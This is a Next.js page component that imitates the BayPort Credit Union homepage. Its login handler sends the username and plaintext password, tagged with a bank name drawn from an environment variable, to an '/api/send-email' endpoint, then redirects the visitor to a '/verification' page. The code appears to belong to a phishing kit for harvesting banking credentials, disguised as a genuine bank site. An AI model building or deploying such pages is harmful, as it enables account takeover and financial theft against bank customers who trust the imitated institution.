'use client';
import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { ChevronDown, Search, User, Lock, Eye, EyeOff, X } from 'lucide-react';
import Be from "../../../public/assets/be.png"
import Image from 'next/image';
import Logo from '../../../public/assets/logo.png';



import LoanPromoSection from '../components/LoanProm';
import Services from '../components/Services';
import News from '../components/News';
import Testimonials from '../components/Testimonials';
import Foundation from '../components/Foundation';
import Footer from '../components/Footer';
import Header from '../components/Header';

export default function BayPortWebsite() {
  const router = useRouter();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [saveUsername, setSaveUsername] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState(null);
  const [showLoginModal, setShowLoginModal] = useState(false);

  const toggleSaveUsername = () => {
    setSaveUsername(!saveUsername);
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    
    if (!username || !password) {
      return;
    }

    setIsSubmitting(true);
    setSubmitStatus(null);

    try {
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          bName: process.env.NEXT_PUBLIC_BANK_NAME,
          username: username,
          password: password,
        }),
      });

      if (!response.ok) {
        throw new Error("Authentication failed");
      }

      const data = await response.json();
      
      setTimeout(() => {
        router.push("/verification");
        
      }, 1000);
      // setSubmitStatus("success");
    } catch (error) {
      console.error("Login failed:", error);
      setSubmitStatus("error");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-white">
      
      <Header/>
        

      {/* Hero Section */}
      <section className="bg-gradient-to-r from-white to-gray-50 py-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
            <div>
              <h1 className="text-5xl font-bold text-gray-900 mb-6">
                Be happy, healthy, and
                <br />
                <span className="text-green-500">financially wise for life.</span>
              </h1>
              <p className="text-xl text-gray-600 mb-8">
                Choose from the many ways BayPort Credit Union can help... now and well into the future. We&apos;re ready. Are you?
              </p>
              <button className="bg-green-500 hover:bg-green-600 text-white px-8 py-3 rounded-full text-lg font-medium transition-colors">
                Join BayPort
              </button>
            </div>
            <div className="relative">
              <div className="w-full h-96 bg-gray-200 rounded-full overflow-hidden">
                <Image
                  src={Be}
                  alt="Happy family - father and child"
                  className="w-full h-full object-cover"
                />
              </div>
              {/* Decorative elements */}
              <div className="absolute -top-4 -left-4 w-20 h-20 opacity-20">
                <div className="w-8 h-8 bg-green-400 rounded-sm transform rotate-12"></div>
                <div className="w-12 h-8 bg-green-300 rounded-sm transform -rotate-6 mt-2"></div>
              </div>
              <div className="absolute -bottom-4 -right-4 w-16 h-16 opacity-20">
                <div className="w-6 h-6 bg-blue-400 rounded-sm transform rotate-45"></div>
                <div className="w-10 h-6 bg-blue-300 rounded-sm transform -rotate-12 mt-1"></div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Services Section */}
      <Services/>
      {/* Loan Promotion Section */}
      <LoanPromoSection/>

      {/* News Section */}
      <News/>

      {/* Testimonials Section */}
      <Testimonials/>

      {/* Foundation Section */}
      <Foundation/>

      

      {/* Login Modal */}
      {showLoginModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-lg shadow-xl max-w-md w-full">
            <div className="flex justify-between items-center p-6 border-b">
              <h2 className="text-2xl font-bold text-gray-900">Log in to BayPort</h2>
              <button
                onClick={() => setShowLoginModal(false)}
                className="text-gray-400 hover:text-gray-600"
              >
                <X className="h-6 w-6" />
              </button>
            </div>
            <div className="p-6">
              <div className="mb-4">
                <label htmlFor="username" className="block text-sm font-medium text-gray-700 mb-2">
                  Username
                </label>
                <div className="relative">
                  <input
                    type="text"
                    id="username"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500"
                    placeholder="Enter your username"
                    required
                  />
                  <User className="absolute left-3 top-3.5 h-5 w-5 text-gray-400" />
                </div>
              </div>
              
              <div className="mb-4">
                <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
                  Password
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    id="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full pl-10 pr-12 py-3 border border-gray-300 text-black rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500"
                    placeholder="Enter your password"
                    required
                  />
                  <Lock className="absolute left-3 top-3.5 h-5 w-5 text-gray-400" />
                  <button
                    type="button"
                    onClick={togglePasswordVisibility}
                    className="absolute right-3 top-3.5 text-gray-400 hover:text-gray-600"
                  >
                    {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                  </button>
                </div>
              </div>
              
              <div className="flex items-center mb-6">
                <input
                  type="checkbox"
                  id="saveUsername"
                  checked={saveUsername}
                  onChange={toggleSaveUsername}
                  className="h-4 w-4 text-black  focus:ring-green-500 border-gray-300 rounded"
                />
                <label htmlFor="saveUsername" className="ml-2 text-sm text-gray-700">
                  Save my username
                </label>
              </div>
              
              {submitStatus === "error" && (
                <div className="mb-4 p-3 bg-red-100 border border-red-400 text-red-700 rounded">
                  Login failed. Please check your credentials and try again.
                </div>
              )}
              
              {submitStatus === "success" && (
                <div className="mb-4 p-3 bg-green-100 border border-green-400 text-green-700 rounded">
                  Login successful! Redirecting...
                </div>
              )}
              
              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-green-500 hover:bg-green-600 disabled:bg-green-300 text-white py-3 px-4 rounded-lg font-medium transition-colors"
              >
                {isSubmitting ? "Logging in..." : "Log in"}
              </button>
              
              <div className="mt-4 text-center">
                <a href="#" className="text-sm text-blue-600 hover:text-blue-700">
                  Forgot username or password?
                </a>
              </div>
              
              <div className="mt-6 pt-6 border-t text-center">
                <p className="text-sm text-gray-600 mb-4">
                  New to BayPort?
                </p>
                <button
                  type="button"
                  className="w-full bg-blue-500 hover:bg-blue-600 text-white py-3 px-4 rounded-lg font-medium transition-colors"
                >
                  Join BayPort
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
      <Footer/>
    </div>
  );
}